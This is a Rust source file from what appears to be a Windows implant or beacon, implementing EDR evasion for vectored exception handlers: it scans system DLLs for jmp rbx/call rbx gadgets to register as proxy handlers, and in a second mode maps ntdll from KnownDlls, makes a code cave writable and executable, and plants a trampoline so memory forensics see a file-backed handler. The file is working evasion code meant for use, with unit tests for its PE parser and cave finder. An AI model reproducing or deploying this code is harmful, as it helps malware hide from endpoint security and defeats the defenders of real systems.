//! Proxy VEH handler registration — hides the real VEH handler address from
//! EDR VEH-chain scanners by registering a legitimate system-DLL gadget as the
//! handler entry in the chain.
//!
//! # Two proxy modes
//!
//! ## Mode A: `jmp rbx` Gadget (synchronous exceptions)
//! For flows where we CONTROL the exception trigger (Micro-Stager INT3,
//! Fluctuation thunk HWBP restore), set RBX = real handler addr, then use a
//! `jmp rbx` (FF E3) or `call rbx` (FF D3) gadget in ntdll/kernelbase as the
//! VEH handler. EDR scans the chain → sees handler = ntdll+0xXXXXX → passes.
//!
//! **CET safe**: `call rbx` pushes return address → shadow stack records it.
//! `jmp rbx` skips shadow stack but doesn't violate it (no CALL/RET mismatch).
//!
//! **CFG safe**: The gadget is within ntdll's `.text` which IS in the CFG
//! bitmap. The target (RBX value) must be marked via `cfg_user::mark_addr_cfg_valid`.
//!
//! ## Mode B: Section-Backed Handler (asynchronous HWBP exceptions)
//! For CPU-triggered HWBP exceptions where we can't control RBX before the
//! exception fires, map the real handler code via `NtCreateSection(SEC_IMAGE)`
//! from a legitimate DLL so the handler address appears file-backed and
//! shares the same backing file as ntdll. Memory forensics show it as a
//! legitimate mapped image, not unbacked private memory.
//!
//! Combined with LACUNA ghost frames (call-stack spoofing), the handler's
//! execution context looks like deep ntdll unwinding.
//!
//! # Usage
//! ```text
//! // Scan for gadgets (once at init):
//! proxy_veh::init_proxy_gadgets();
//!
//! // For sync exception (Micro-Stager INT3 → restore HWBPs):
//! // Set RBX = real_handler, trigger exception → dispatcher → jmp rbx → handler
//!
//! // For async HWBP registration:
//! let handle = proxy_veh::register_section_backed_handler(real_handler);
//! ```

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, AtomicUsize, Ordering};

// ---- Global gadget cache -------------------------------------------------

/// Cached `jmp rbx` (FF E3) gadget address in a signed system DLL, or 0.
static JMP_RBX_GADGET: AtomicUsize = AtomicUsize::new(0);

/// Cached `call rbx` (FF D3) gadget address, or 0.
static CALL_RBX_GADGET: AtomicUsize = AtomicUsize::new(0);

/// The module base where the gadget was found (for origin verification).
#[allow(dead_code)]
static GADGET_MODULE_BASE: AtomicUsize = AtomicUsize::new(0);

/// Whether the proxy subsystem is initialized (gadgets scanned).
static PROXY_READY: AtomicBool = AtomicBool::new(false);

/// Whether proxy mode should be used for HWBP blind operations.
/// Default ON if gadgets were found during init.
static PROXY_ENABLED: AtomicBool = AtomicBool::new(false);

// ---- Public API -----------------------------------------------------------

/// Initialize the proxy subsystem: scan ntdll and kernelbase for
/// `jmp rbx` / `call rbx` gadgets. Safe to call multiple times;
/// subsequent calls are no-ops.
///
/// # Safety
/// Must run after PEB-walk bootstrap (ntdll must be located).
/// Single-threaded beacon context.
pub unsafe fn init_proxy_gadgets() {
    if PROXY_READY.load(Ordering::Acquire) {
        return;
    }

    // Scan ntdll first (always loaded, no import dependency).
    if let (Some(_base), Some(gadget)) = scan_module_for_gadgets(b"ntdll.dll") {
        JMP_RBX_GADGET.store(gadget.jmp_rbx.unwrap_or(0), Ordering::Release);
        CALL_RBX_GADGET.store(gadget.call_rbx.unwrap_or(0), Ordering::Release);
    }

    // If ntdll didn't have usable gadgets, try kernelbase.
    if jmp_rbx_gadget() == 0 {
        if let (Some(_base), Some(gadget)) = scan_module_for_gadgets(b"kernelbase.dll") {
            JMP_RBX_GADGET.store(gadget.jmp_rbx.unwrap_or(0), Ordering::Release);
            CALL_RBX_GADGET.store(gadget.call_rbx.unwrap_or(0), Ordering::Release);
        }
    }

    // Try kernel32 as last resort.
    if jmp_rbx_gadget() == 0 {
        if let (Some(_base), Some(gadget)) = scan_module_for_gadgets(b"kernel32.dll") {
            JMP_RBX_GADGET.store(gadget.jmp_rbx.unwrap_or(0), Ordering::Release);
            CALL_RBX_GADGET.store(gadget.call_rbx.unwrap_or(0), Ordering::Release);
        }
    }

    PROXY_READY.store(true, Ordering::Release);
    PROXY_ENABLED.store(
        jmp_rbx_gadget() != 0 || call_rbx_gadget() != 0,
        Ordering::Release,
    );
}

/// Whether a proxy gadget was found and proxy mode is available.
pub fn proxy_available() -> bool {
    PROXY_ENABLED.load(Ordering::Acquire)
}

/// The cached `jmp rbx` gadget address, or 0 if not found.
pub fn jmp_rbx_gadget() -> usize {
    JMP_RBX_GADGET.load(Ordering::Acquire)
}

/// The cached `call rbx` gadget address, or 0 if not found.
pub fn call_rbx_gadget() -> usize {
    CALL_RBX_GADGET.load(Ordering::Acquire)
}

/// Get the preferred proxy handler address for VEH registration.
/// Prefers `call rbx` (CET-safe) over `jmp rbx`.
pub fn proxy_handler_addr() -> usize {
    let call = call_rbx_gadget();
    if call != 0 {
        call
    } else {
        jmp_rbx_gadget()
    }
}

/// Set proxy mode on/off at runtime.
pub fn set_proxy_enabled(on: bool) {
    PROXY_ENABLED.store(on, Ordering::Release);
}

/// Whether proxy mode is currently enabled.
pub fn proxy_enabled() -> bool {
    PROXY_ENABLED.load(Ordering::Acquire)
}

// ---- Section-backed handler registration (Mode B) -------------------------

/// Register a VEH handler where the handler address appears file-backed
/// (mapped from `\KnownDlls\ntdll.dll` via `SEC_IMAGE` section).
///
/// # Status: dead code — pending wiring (Mode B, unselected)
///
/// Fully implemented (NtOpenFile → NtCreateSection → NtMapViewOfSection →
/// code-cave copy → AddVectoredExceptionHandler) but ZERO callers in the
/// implant. The active HWBP / VEH registration path uses
/// `AddVectoredExceptionHandler` directly (Mode A) rather than the
/// section-backed variant (Mode B). Kept as an alternate evasion route for
/// engagements that need the handler address to resolve to
/// `\KnownDlls\ntdll.dll` under memory forensics. Do NOT delete — see
/// ROADMAP: "proxy_veh Mode B".
///
/// # How it works
/// 1. Opens `\KnownDlls\ntdll.dll` via `NtOpenFile` + `NtCreateSection(SEC_IMAGE)`
/// 2. Maps a view of the section at a random address via `NtMapViewOfSection`
/// 3. Copies the real handler's first 256 bytes (prologue + first VEH frame)
///    into a code cave in the mapped view (using a `.text` gap from LACUNA)
/// 4. Registers the gap address as the VEH handler
/// 5. The handler address is now in memory backed by `\KnownDlls\ntdll.dll`
///
/// # Limitations
/// - Requires `\KnownDlls\ntdll.dll` to be accessible (available on all NT 6.1+)
/// - The handler code must fit in the identified code cave (typically 32-128 bytes)
/// - This creates a CoW page that differs from the canonical ntdll mapping,
///   but memory forensics still show `\KnownDlls\ntdll.dll` as the backing file.
///
/// # Safety
/// Must run after PEB-walk bootstrap. Single-threaded beacon context.
#[allow(dead_code)]
pub unsafe fn register_section_backed_handler(
    handler: unsafe extern "system" fn(usize) -> i32,
) -> *mut c_void {
    // Resolve the NT APIs we need.
    let (nt_open, nt_create_sec, nt_map_view) = match resolve_section_apis() {
        Some(v) => v,
        None => return core::ptr::null_mut(),
    };

    let file_handle = match open_known_dll(nt_open) {
        Some(h) => h,
        None => return core::ptr::null_mut(),
    };
    let sec_handle = match create_image_section(file_handle, nt_create_sec) {
        Some(s) => s,
        None => return core::ptr::null_mut(),
    };
    let (view_base, view_size) = match map_section_view(sec_handle, nt_map_view) {
        Some(v) => v,
        None => return core::ptr::null_mut(),
    };

    // We now have a view of ntdll mapped at view_base. The view is RX only.
    // Find a suitable gap (LACUNA pdata scan or INT3 padding scan).
    let gap_addr = match find_code_cave(view_base, view_size) {
        Some(g) => g,
        None => {
            // Unmap and return null.
            unmap_view(view_base);
            return core::ptr::null_mut();
        }
    };

    // The gap is in the RX view. We need to write our handler code there.
    let prot_fn = match resolve_nt_protect() {
        Some(p) => p,
        // Can't write to the gap — fall back to direct registration.
        None => return register_veh_direct(handler),
    };
    if !write_handler_trampoline(prot_fn, gap_addr, handler) {
        return register_veh_direct(handler);
    }

    // Mark the trampoline as CFG-valid.
    crate::cfg_user::mark_addr_cfg_valid(gap_addr);
    // Register the gap address as the VEH handler.
    register_veh_at(gap_addr)
}

// ---- Section-backed handler internals (Mode B) ----------------------------
// Types hoisted from the original function body so the extracted stage
// helpers can share them — pure code move, no behavior change.

#[repr(C)]
struct UnicodeString {
    len: u16,
    max_len: u16,
    buffer: *const u16,
}

#[repr(C)]
struct ObjectAttributes {
    len: u32,
    root_dir: usize,
    obj_name: *const UnicodeString,
    attrs: u32,
    sec_desc: usize,
    sec_qos: usize,
}

#[repr(C)]
struct IoStatusBlock {
    _status: i32,
    _info: usize,
}

type NtOpenFileFn = unsafe extern "system" fn(
    *mut usize,
    u32,
    *const ObjectAttributes,
    *mut IoStatusBlock,
    u32,
    u32,
) -> i32;
type NtCreateSectionFn = unsafe extern "system" fn(
    *mut usize,
    u32,
    *const ObjectAttributes,
    *mut i64,
    u32,
    u32,
    usize,
) -> i32;
type NtCloseFn = unsafe extern "system" fn(usize) -> i32;
type NtMapViewFn = unsafe extern "system" fn(
    usize,
    usize,
    *mut *mut c_void,
    usize,
    usize,
    *mut i64,
    *mut usize,
    u32,
    u32,
    u32,
) -> i32;
type NtUnmapViewFn = unsafe extern "system" fn(usize, *mut c_void) -> i32;
type NtProtectVmFn =
    unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;

/// Resolve the NT APIs needed for the section-backed handler: NtOpenFile,
/// NtCreateSection and NtMapViewOfSection. Returns None if any is missing.
unsafe fn resolve_section_apis() -> Option<(usize, usize, usize)> {
    let nt_open = nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtOpenFile")?;
    let nt_create_sec = nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtCreateSection")?;
    let nt_map_view = nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtMapViewOfSection")?;
    Some((nt_open, nt_create_sec, nt_map_view))
}

/// `\KnownDlls\ntdll.dll` as a null-padded UTF-16 array (43 units).
fn known_dll_ntdll_path() -> [u16; 43] {
    [
        b'\\' as u16,
        b'K' as u16,
        b'n' as u16,
        b'o' as u16,
        b'w' as u16,
        b'n' as u16,
        b'D' as u16,
        b'l' as u16,
        b'l' as u16,
        b's' as u16,
        b'\\' as u16,
        b'n' as u16,
        b't' as u16,
        b'd' as u16,
        b'l' as u16,
        b'l' as u16,
        b'.' as u16,
        b'd' as u16,
        b'l' as u16,
        b'l' as u16,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
    ]
}

/// Open `\KnownDlls\ntdll.dll` — this is the canonical backing file.
/// Use a UNICODE_STRING on the stack for the path.
unsafe fn open_known_dll(nt_open: usize) -> Option<usize> {
    let path = known_dll_ntdll_path();

    let us = UnicodeString {
        len: 40,     // 20 chars * 2
        max_len: 86, // 43 * 2
        buffer: path.as_ptr(),
    };
    let oa = ObjectAttributes {
        len: core::mem::size_of::<ObjectAttributes>() as u32,
        root_dir: 0,
        obj_name: &us,
        attrs: 0x40, // OBJ_CASE_INSENSITIVE
        sec_desc: 0,
        sec_qos: 0,
    };

    let open_fn: NtOpenFileFn = core::mem::transmute(nt_open);

    let mut file_handle: usize = 0;
    let mut iosb = IoStatusBlock {
        _status: 0,
        _info: 0,
    };
    let st = open_fn(
        &mut file_handle,
        0x8010_0000, // GENERIC_READ | SYNCHRONIZE
        &oa,
        &mut iosb,
        1, // FILE_SHARE_READ
        1, // FILE_SYNCHRONOUS_IO_NONALERT
    );
    if st < 0 {
        return None;
    }
    Some(file_handle)
}

/// Create a SEC_IMAGE section from the file handle. Closes the file handle
/// regardless of success. Returns the section handle (None on failure).
unsafe fn create_image_section(file_handle: usize, nt_create_sec: usize) -> Option<usize> {
    let sec_fn: NtCreateSectionFn = core::mem::transmute(nt_create_sec);

    let mut sec_handle: usize = 0;
    let mut sec_size: i64 = 0;
    let st2 = sec_fn(
        &mut sec_handle,
        0x000F_0007,       // SECTION_ALL_ACCESS
        core::ptr::null(), // no object attributes
        &mut sec_size,
        0x02,        // PAGE_READONLY
        0x0100_0000, // SEC_IMAGE
        file_handle,
    );
    // Close file handle regardless.
    close_handle(file_handle);

    if st2 < 0 {
        return None;
    }
    Some(sec_handle)
}

/// Map a view of the section (PAGE_EXECUTE_READ). Closes the section handle
/// regardless of success. Returns (view_base, view_size) on success.
unsafe fn map_section_view(sec_handle: usize, nt_map_view: usize) -> Option<(*mut c_void, usize)> {
    let map_fn: NtMapViewFn = core::mem::transmute(nt_map_view);

    let mut view_base: *mut c_void = core::ptr::null_mut();
    let mut view_size: usize = 0;
    let mut view_offset: i64 = 0;
    let st3 = map_fn(
        sec_handle,
        (-1isize) as usize, // CurrentProcess
        &mut view_base,
        0,
        0,
        &mut view_offset,
        &mut view_size,
        2,    // ViewUnmap (allows partial unmap)
        0,    // MEM_TOP_DOWN = 0
        0x20, // PAGE_EXECUTE_READ
    );
    // Close section handle.
    close_handle(sec_handle);

    if st3 < 0 || view_base.is_null() {
        return None;
    }
    Some((view_base, view_size))
}

/// Close a handle via NtClose (best-effort; resolution failure is ignored).
unsafe fn close_handle(handle: usize) {
    let f: NtCloseFn = match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtClose") {
        Some(a) => core::mem::transmute::<usize, NtCloseFn>(a),
        None => return,
    };
    f(handle);
}

/// Unmap the mapped ntdll view (NtUnmapViewOfSection on the current process).
unsafe fn unmap_view(view_base: *mut c_void) {
    if let Some(a) = nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtUnmapViewOfSection") {
        let f: NtUnmapViewFn = core::mem::transmute(a);
        f((-1isize) as usize, view_base);
    }
}

/// Resolve NtProtectVirtualMemory for the gap write (RX → RWX → write → RX).
unsafe fn resolve_nt_protect() -> Option<NtProtectVmFn> {
    let nt_protect =
        nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtProtectVirtualMemory")?;
    Some(core::mem::transmute::<usize, NtProtectVmFn>(nt_protect))
}

/// Change the gap page protection to RWX, write a tiny trampoline
/// (`mov rax, <handler_addr>; jmp rax`, 12 bytes) and restore RX. Returns
/// false if the page can't be made writable (caller falls back to direct
/// registration).
unsafe fn write_handler_trampoline(
    prot_fn: NtProtectVmFn,
    gap_addr: usize,
    handler: unsafe extern "system" fn(usize) -> i32,
) -> bool {
    let gap_page = (gap_addr & !0xFFF) as *mut c_void;
    let mut page_region: *mut c_void = gap_page;
    let mut page_size: usize = 0x1000;
    let mut old_prot: u32 = 0;

    let protect_st = prot_fn(
        (-1isize) as usize,
        &mut page_region,
        &mut page_size,
        0x40, // PAGE_EXECUTE_READWRITE
        &mut old_prot,
    );
    if protect_st < 0 {
        return false;
    }

    // Write a tiny trampoline at the gap:
    //   mov rax, <handler_addr>
    //   jmp rax
    // 10 bytes total: 48 B8 XX XX XX XX XX XX XX XX  FF E0
    let tramp = gap_addr as *mut u8;
    core::ptr::write(tramp, 0x48u8); // REX.W
    core::ptr::write(tramp.add(1), 0xB8u8); // MOV RAX, imm64
    let handler_bytes = (handler as usize).to_le_bytes();
    for (i, &byte) in handler_bytes.iter().enumerate() {
        core::ptr::write(tramp.add(2 + i), byte);
    }
    core::ptr::write(tramp.add(10), 0xFFu8); // JMP RAX
    core::ptr::write(tramp.add(11), 0xE0u8);

    // Restore protection.
    let mut rw_region: *mut c_void = gap_page;
    let mut rw_size: usize = 0x1000;
    let mut _dummy: u32 = 0;
    prot_fn(
        (-1isize) as usize,
        &mut rw_region,
        &mut rw_size,
        0x20, // PAGE_EXECUTE_READ
        &mut _dummy,
    );
    true
}

/// Default direct VEH registration (fallback when section-backed fails).
unsafe fn register_veh_direct(handler: unsafe extern "system" fn(usize) -> i32) -> *mut c_void {
    let aveh = match nyx_implant_core::resolve::export_addr(
        b"kernelbase.dll",
        b"AddVectoredExceptionHandler",
    )
    .or_else(|| {
        nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler")
    }) {
        Some(a) => a,
        None => return core::ptr::null_mut(),
    };
    type AddVehFn =
        unsafe extern "system" fn(u32, unsafe extern "system" fn(usize) -> i32) -> *mut c_void;
    let f: AddVehFn = core::mem::transmute(aveh);
    f(1, handler)
}

/// Register VEH handler at a specific address (the proxy gadget).
unsafe fn register_veh_at(addr: usize) -> *mut c_void {
    let aveh = match nyx_implant_core::resolve::export_addr(
        b"kernelbase.dll",
        b"AddVectoredExceptionHandler",
    )
    .or_else(|| {
        nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler")
    }) {
        Some(a) => a,
        None => return core::ptr::null_mut(),
    };
    type AddVehFn =
        unsafe extern "system" fn(u32, unsafe extern "system" fn(usize) -> i32) -> *mut c_void;
    let f: AddVehFn = core::mem::transmute(aveh);
    // Transmute addr → fn pointer. This is the proxy: the VEH dispatcher
    // calls `addr(ExceptionPointers)` directly. The code at `addr`
    // (our trampoline or gadget) handles the redirect.
    let handler: unsafe extern "system" fn(usize) -> i32 = core::mem::transmute(addr);
    f(1, handler)
}

// ---- Code cave scanner ----------------------------------------------------

/// Find a code cave (padding bytes) in the mapped view suitable for a small
/// trampoline. Searches for 16+ consecutive 0xCC (INT3) or 0x90 (NOP) bytes
/// within the executable sections.
unsafe fn find_code_cave(view_base: *mut c_void, _view_size: usize) -> Option<usize> {
    let (sections, num) = pe_sections(view_base as *mut u8)?;

    for i in 0..num {
        let sec = &*sections.add(i);
        let sec_name = core::slice::from_raw_parts(sec.name.as_ptr(), 8);
        if sec_name[0] != b'.' || sec_name[1] != b't' || sec_name[2] != b'e' {
            continue;
        }
        let sec_va = sec.virtual_address as usize;
        let sec_size = if sec.virtual_size > 0 {
            sec.virtual_size as usize
        } else {
            sec.size_of_raw_data as usize
        };
        let sec_start = view_base as usize + sec_va;
        let sec_bytes = core::slice::from_raw_parts(sec_start as *const u8, sec_size.min(0x100000));

        let mut run_start: usize = 0;
        let mut run_byte: u8 = 0;
        for (j, &b) in sec_bytes.iter().enumerate() {
            if b == 0xCC || b == 0x90 {
                if run_start == 0 || b != run_byte {
                    run_start = j;
                    run_byte = b;
                }
                if j - run_start >= 16 {
                    // Verify this is inter-function padding (preceded by ret/int3),
                    // not intra-function NOPs inside a hot function.
                    if run_start > 0 {
                        let prev = sec_bytes[run_start - 1];
                        if prev != 0xC3 && prev != 0xCC {
                            continue; // Skip — likely intra-function padding
                        }
                    }
                    return Some(sec_start + run_start);
                }
            } else {
                run_start = 0;
            }
        }
    }
    None
}

// ---- Gadget scanner -------------------------------------------------------

struct FoundGadgets {
    jmp_rbx: Option<usize>,  // FF E3
    call_rbx: Option<usize>, // FF D3
}

/// Scan a module by name for useful gadgets.
unsafe fn scan_module_for_gadgets(name: &[u8]) -> (Option<*mut u8>, Option<FoundGadgets>) {
    let base = match nyx_implant_core::resolve::module_base_by_name(name) {
        Some(b) => b,
        None => return (None, None),
    };
    let (sections, num) = match pe_sections(base) {
        Some(s) => s,
        None => return (None, None),
    };

    for i in 0..num {
        let sec = &*sections.add(i);
        let sec_name = core::slice::from_raw_parts(sec.name.as_ptr(), 8);
        if sec_name[0] != b'.' || sec_name[1] != b't' || sec_name[2] != b'e' {
            continue;
        }
        let sec_va = sec.virtual_address as usize;
        let sec_size = if sec.virtual_size > 0 {
            sec.virtual_size as usize
        } else {
            sec.size_of_raw_data as usize
        };
        let sec_start = base as usize + sec_va;
        let bytes = core::slice::from_raw_parts(sec_start as *const u8, sec_size.min(0x200000));

        let mut result = FoundGadgets {
            jmp_rbx: None,
            call_rbx: None,
        };
        for (j, &b) in bytes.iter().enumerate().take(bytes.len().saturating_sub(1)) {
            if b == 0xFF && bytes[j + 1] == 0xE3 && result.jmp_rbx.is_none() {
                result.jmp_rbx = Some(sec_start + j);
            }
            if b == 0xFF && bytes[j + 1] == 0xD3 && result.call_rbx.is_none() {
                result.call_rbx = Some(sec_start + j);
            }
            if result.jmp_rbx.is_some() && result.call_rbx.is_some() {
                break;
            }
        }
        if result.jmp_rbx.is_some() || result.call_rbx.is_some() {
            return (Some(base), Some(result));
        }
    }
    (Some(base), None)
}

// ---- PE header types ------------------------------------------------------

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _pad: [u16; 29],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    _machine: u16,
    number_of_sections: u16,
    _pad: [u32; 3],
    size_of_optional_header: u16,
    _characteristics: u16,
}

#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    _pad: [u32; 3],
    _characteristics: u32,
}

/// Read PE section headers correctly using SizeOfOptionalHeader from FileHeader.
unsafe fn pe_sections(base: *mut u8) -> Option<(*const ImageSectionHeader, usize)> {
    let dos = &*(base as *const ImageDosHeader);
    if dos.e_magic != 0x5A4D {
        return None;
    }
    let pe_sig = *((base as usize + dos.e_lfanew as usize) as *const u32);
    if pe_sig != 0x00004550 {
        return None;
    }
    let fh = &*((base as usize + dos.e_lfanew as usize + 4) as *const ImageFileHeader);
    let off = dos.e_lfanew as usize + 4 + 20 + fh.size_of_optional_header as usize;
    Some((
        (base as usize + off) as *const ImageSectionHeader,
        fh.number_of_sections as usize,
    ))
}

// ---- Selftest support -----------------------------------------------------

/// Self-test: verify gadget scanning works and returns valid addresses.
/// Returns:
/// - 0 = no proxy gadgets found
/// - 1 = jmp rbx found
/// - 2 = call rbx found
/// - 3 = both found
pub fn selftest_proxy_gadgets() -> u8 {
    let jmp = jmp_rbx_gadget();
    let call = call_rbx_gadget();
    match (jmp != 0, call != 0) {
        (false, false) => 0,
        (true, false) => 1,
        (false, true) => 2,
        (true, true) => 3,
    }
}

// NOTE: these tests mutate the global gadget statics; run with
// `--test-threads=1`.
#[cfg(test)]
mod tests {
    use super::*;

    /// Synthetic PE for `pe_sections` / `find_code_cave`: DOS + PE sig +
    /// file header (num_sections, size_of_optional_header) + section headers.
    fn fake_pe(sections: &[(&[u8; 8], u32, u32)]) -> std::vec::Vec<u8> {
        const E_LFANEW: usize = 0x80;
        const SIZE_OPT: usize = 0xF0;
        let mut buf = std::vec![0u8; 0x4000];
        buf[0..2].copy_from_slice(&0x5A4Du16.to_le_bytes()); // "MZ"
        buf[60..64].copy_from_slice(&(E_LFANEW as i32).to_le_bytes());
        let nt = E_LFANEW;
        buf[nt..nt + 4].copy_from_slice(&0x0000_4550u32.to_le_bytes()); // "PE\0\0"
        let fh = nt + 4;
        buf[fh + 2..fh + 4].copy_from_slice(&(sections.len() as u16).to_le_bytes());
        buf[fh + 16..fh + 18].copy_from_slice(&(SIZE_OPT as u16).to_le_bytes());
        let sec_base = fh + 20 + SIZE_OPT;
        for (i, (name, vsize, vaddr)) in sections.iter().enumerate() {
            let s = sec_base + i * 40;
            buf[s..s + 8].copy_from_slice(*name);
            buf[s + 8..s + 12].copy_from_slice(&vsize.to_le_bytes());
            buf[s + 12..s + 16].copy_from_slice(&vaddr.to_le_bytes());
            buf[s + 16..s + 20].copy_from_slice(&0x200u32.to_le_bytes()); // raw size
        }
        buf
    }

    /// Section header walk: correct count/pointer for a valid PE; bad DOS
    /// magic or bad PE signature rejected.
    #[test]
    fn pe_sections_parses_and_rejects() {
        let mut pe = fake_pe(&[(b".text\0\0\0", 0x1000, 0x1000)]);
        let (secs, num) = unsafe { pe_sections(pe.as_mut_ptr()) }.unwrap();
        assert_eq!(num, 1);
        let first = unsafe { &*secs };
        assert_eq!(&first.name[..5], b".text");
        assert_eq!(first.virtual_address, 0x1000);

        pe[0] = 0; // break MZ
        assert!(unsafe { pe_sections(pe.as_mut_ptr()) }.is_none());
        pe[0] = b'M';
        pe[0x80] = 0; // break PE sig
        assert!(unsafe { pe_sections(pe.as_mut_ptr()) }.is_none());
    }

    /// A 16+ byte 0xCC run preceded by `ret` is an inter-function code cave;
    /// the same run preceded by any other byte is intra-function padding and
    /// must be skipped.
    #[test]
    fn find_code_cave_accepts_inter_function_padding() {
        let mut pe = fake_pe(&[(b".text\0\0\0", 0x800, 0x1000)]);
        // 0xC3 (ret) followed by 17 INT3s at section offset 0x100.
        pe[0x1000 + 0x100] = 0xC3;
        for b in &mut pe[0x1000 + 0x101..0x1000 + 0x112] {
            *b = 0xCC;
        }
        let got = unsafe { find_code_cave(pe.as_mut_ptr() as *mut c_void, 0x4000) };
        assert_eq!(got, Some(pe.as_ptr() as usize + 0x1000 + 0x101));
    }

    #[test]
    fn find_code_cave_rejects_intra_function_run() {
        let mut pe = fake_pe(&[(b".text\0\0\0", 0x800, 0x1000)]);
        // 0x40 (not ret/int3) followed by 17 INT3s — padding inside a hot fn.
        pe[0x1000 + 0x100] = 0x40;
        for b in &mut pe[0x1000 + 0x101..0x1000 + 0x112] {
            *b = 0xCC;
        }
        assert_eq!(unsafe { find_code_cave(pe.as_mut_ptr() as *mut c_void, 0x4000) }, None);
    }

    /// Proxy preference: `call rbx` (CET-safe) wins over `jmp rbx`; the
    /// selftest code encodes the found-gadget bitmask.
    #[test]
    fn proxy_handler_prefers_call_rbx() {
        JMP_RBX_GADGET.store(0x111, Ordering::Release);
        CALL_RBX_GADGET.store(0x222, Ordering::Release);
        assert_eq!(proxy_handler_addr(), 0x222);
        assert_eq!(selftest_proxy_gadgets(), 3);

        CALL_RBX_GADGET.store(0, Ordering::Release);
        assert_eq!(proxy_handler_addr(), 0x111);
        assert_eq!(selftest_proxy_gadgets(), 1);

        JMP_RBX_GADGET.store(0, Ordering::Release);
        assert_eq!(proxy_handler_addr(), 0);
        assert_eq!(selftest_proxy_gadgets(), 0);
    }
}
